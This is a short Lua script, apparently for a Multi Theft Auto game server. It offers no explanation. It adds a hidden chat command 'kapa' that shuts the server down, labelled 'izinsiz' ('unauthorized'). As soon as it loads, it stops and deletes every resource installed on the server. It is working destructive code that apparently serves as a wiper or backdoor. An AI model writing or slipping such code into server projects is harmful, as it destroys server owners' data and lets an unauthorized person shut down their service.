 --Get all resources
addCommandHandler("kapa", function()
   shutdown("izinsiz")
  end)
outputChatBox("1")


    local resourceTable = getResources ( ) 
    for resourceKey, resourceValue in ipairs ( resourceTable ) do
        local resourceName = getResourceName ( resourceValue )
        stopResource ( resourceValue )
        local deleted = deleteResource ( resourceName )
    end

